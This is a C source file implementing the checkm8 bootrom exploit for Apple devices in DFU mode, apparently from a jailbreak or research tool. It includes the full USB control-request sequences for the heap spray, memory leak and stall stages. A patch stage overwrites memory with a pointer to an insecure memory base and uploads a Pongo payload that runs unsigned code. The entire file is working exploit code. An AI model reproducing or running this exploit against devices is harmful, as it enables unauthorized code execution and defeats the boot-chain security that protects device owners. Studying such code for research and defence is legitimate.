#include "checkm8.h"

#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>

#include "payload.h"
#include "dfu.h"

#include "../utils.h"
#include "../usb/shim.h"

static struct {
    uint8_t b_len, b_descriptor_type;
    uint16_t bcd_usb;
    uint8_t b_device_class, b_device_sub_class, b_device_protocol, b_max_packet_sz;
    uint16_t id_vendor, id_product, bcd_device;
    uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
} device_descriptor;

static bool dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state) {
    struct {
        uint8_t status, poll_timeout[3], state, str_idx;
    } dfu_status;
    transfer_ret_t transfer_ret;

    return send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret)
    && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(dfu_status)
    && dfu_status.status == status && dfu_status.state == state;
}

static bool dfu_set_state_wait_reset(const usb_handle_t *handle) {
    transfer_ret_t transfer_ret;

    return send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, &transfer_ret)
    && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == 0
    && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC)
    && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST)
    && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
}

bool checkm8_stage_reset(const usb_handle_t *handle) {
    transfer_ret_t transfer_ret;

    if(send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret)
        && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == DFU_FILE_SUFFIX_LEN
        && dfu_set_state_wait_reset(handle) && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, &transfer_ret)
        && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == EP0_MAX_PACKET_SZ)
    {
        return true;
    }
    send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
    return false;
}

bool checkm8_stage_setup(const usb_handle_t *handle, struct DeviceConfiguration *deviceConfig) {
    unsigned usb_abort_timeout = USB_TIMEOUT - 1;
    transfer_ret_t transfer_ret;

    for(;;) {
        if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret)
            && transfer_ret.sz < deviceConfig->config_overwrite_pad
            && send_usb_control_request_no_data(handle, 0, 0, 0, 0, deviceConfig->config_overwrite_pad - transfer_ret.sz, &transfer_ret)
            && transfer_ret.ret == USB_TRANSFER_STALL)
        {
            return true;
        }

        send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
        usb_abort_timeout = (usb_abort_timeout + 1) % (USB_TIMEOUT + 1);
    }

    return false;
}

static bool checkm8_usb_request_leak(const usb_handle_t *handle) {
    transfer_ret_t transfer_ret;

    return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static void checkm8_stall(const usb_handle_t *handle) {
    unsigned usb_abort_timeout = USB_TIMEOUT - 1;
    transfer_ret_t transfer_ret;

    for(;;) {
        if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ && checkm8_usb_request_leak(handle)) {
            break;
        }
        usb_abort_timeout = (usb_abort_timeout + 1) % (USB_TIMEOUT + 1);
    }
}

static bool checkm8_no_leak(const usb_handle_t *handle) {
    transfer_ret_t transfer_ret;

    return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret)
    && transfer_ret.sz == 0;
}

static bool checkm8_usb_request_stall(const usb_handle_t *handle) {
    transfer_ret_t transfer_ret;

    return send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &transfer_ret)
    && transfer_ret.ret == USB_TRANSFER_STALL;
}

char *get_usb_serial_number(usb_handle_t *handle) {
    transfer_ret_t transfer_ret;
    uint8_t buf[UINT8_MAX];
    char *str = NULL;
    size_t i, sz;

    if(send_usb_control_request(handle, 0x80, 6, 1U << 8U, 0, &device_descriptor, sizeof(device_descriptor), &transfer_ret)
        && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(device_descriptor)
        && send_usb_control_request(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 0x409, buf, sizeof(buf), &transfer_ret)
        && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == buf[0]
        && (sz = buf[0] / 2) != 0 && (str = malloc(sz)) != NULL)
    {
        for(i = 0; i < sz; ++i) {
            str[i] = (char)buf[2 * (i + 1)];
        }
        str[sz - 1] = '\0';
    }
    return str;
}


bool checkm8_stage_spray(const usb_handle_t *handle, struct DeviceConfiguration *deviceConfig) {
    size_t i;

    if(deviceConfig->config_large_leak == 0) {
        if(deviceConfig->cpid == 0x7001 || deviceConfig->cpid == 0x7000 || deviceConfig->cpid == 0x7002 || deviceConfig->cpid == 0x8003 || deviceConfig->cpid == 0x8000) {
            while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
        } else {
            checkm8_stall(handle);
            for(i = 0; i < deviceConfig->config_hole; ++i) {
                while(!checkm8_no_leak(handle)) {}
            }
            while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
        }
        send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
    } else {
        for(i = 0; i < deviceConfig->config_large_leak; ++i) {
            while(!checkm8_usb_request_stall(handle)) {}
        }
        send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
    }
    return true;
}

bool checkm8_stage_patch(const usb_handle_t *handle, struct DeviceConfiguration *deviceConfig, struct PayloadConfiguration *payloadConfig) {
    size_t i, data_sz, packet_sz;
    uint8_t *payload = NULL;
    uint8_t *data;
    transfer_ret_t transfer_ret;
    bool ret = false;

    void* blank[DFU_MAX_TRANSFER_SZ];
    memset(blank, 0, DFU_MAX_TRANSFER_SZ);
    uint64_t* p = (uint64_t*)blank;
    p[5] = payloadConfig->insecure_memory_base;

    create_pongo_payload_for_device(deviceConfig->cpid, &payload, &data_sz);

    if (payload == NULL || data_sz == 0) {
        ERROR("unsupported cpid 0x%X", (unsigned)deviceConfig->cpid);
        return false;
    }

    VERBOSE("setting up stage 2 for CPID 0x%X", (unsigned)deviceConfig->cpid);

    data = calloc(1, data_sz);
    if (!data) {
        ERROR("failed to allocate payload buffer");
        return false;
    }

    memcpy(data, payload, data_sz);

    if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
        VERBOSE("successfully leaked data");
    } else {
        ERROR("failed to leak data");
        return false;
    }
    for(i = 0; i < 2; i++) {
        VERBOSE("i = %zu", i);
        send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, NULL);
    }
    if(p != NULL && send_usb_control_request(handle, 0x00, 0, 0, 0x00, p, 0x30, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
        ret = true;
        for(i = 0; ret && i < data_sz; i += packet_sz) {
            packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
            ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
        }
        send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
    }
    free(data);
    return ret;
}
